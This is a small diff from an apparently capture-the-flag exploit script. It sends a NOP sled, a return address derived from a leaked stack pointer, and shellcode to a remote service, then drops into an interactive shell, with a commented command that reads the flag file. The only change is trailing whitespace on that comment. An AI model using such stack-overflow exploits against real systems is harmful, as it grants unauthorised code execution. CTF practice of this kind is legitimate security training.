@@ -18,6 +18,6 @@ print hex(esp)
 # payload = "A"*20+pack('<I', esp+20)  + shellcode
 conn.send('\x90'*20+pack('<I',esp+20)+shellcode)
 # conn.send(payload)
-# conn.send(b'cat /home/start/flag\n')
+# conn.send(b'cat /home/start/flag\n')                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
 # print conn.recv()
 conn.interactive()
